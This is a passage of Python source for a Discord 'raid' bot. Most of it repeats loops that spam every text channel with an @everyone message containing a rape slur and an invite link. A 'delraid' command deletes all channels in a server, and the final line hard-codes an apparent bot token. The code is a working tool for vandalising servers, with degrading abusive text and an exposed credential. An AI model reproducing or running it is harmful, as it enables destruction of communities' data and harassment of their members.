        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")


    @bot.command()
    async def delraid(ctx):
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()
            await ctx.reply("k doing rn slave master")

    





    bot.run("MTIxMzMyMTIzNTEzNjc3ODI3MA.Ga8gjg.XWiJ-KxFHGLtgZpxAZ0WRku6qQXnT1EifmiNEg")